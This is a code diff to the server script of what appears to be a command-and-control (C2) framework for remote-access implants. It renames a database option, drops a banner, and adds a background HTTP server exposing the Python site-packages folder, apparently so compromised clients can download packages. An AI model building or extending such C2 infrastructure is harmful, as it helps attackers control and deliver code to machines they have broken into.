@@ -19,6 +19,7 @@ import datetime
 import threading
 import subprocess
 import collections
+import multiprocessing
 
 # modules
 import core.util as util
@@ -62,7 +63,6 @@ except ImportError:
 
 # main
 def main():
-    print(colorama.Fore.RED + colorama.Style.NORMAL + __banner__)
     parser = argparse.ArgumentParser(
         prog='server.py',
         version='0.1.4',
@@ -83,16 +83,20 @@ def main():
         help='server port number')
 
     parser.add_argument(
-        '--db',
+        '--database',
         action='store',
         type=str,
         default='database.db',
         help='SQLite database')
 
     options = parser.parse_args()
+    modules = os.path.abspath('modules')
+    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'][0]
 
-    globals()['handler'] = subprocess.Popen([sys.executable, 'core/handlers.py', '--host', options.host, '--port', str(options.port)], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
-    globals()['c2'] = C2(host=options.host, port=options.port, db=options.db)
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+#    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
+
     c2.run()
 
 
@@ -673,7 +677,7 @@ class C2():
 
         """
         self._active.set()
-        if 'c2_server' not in globals()['__threads']:
+        if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
         while True:
             try:
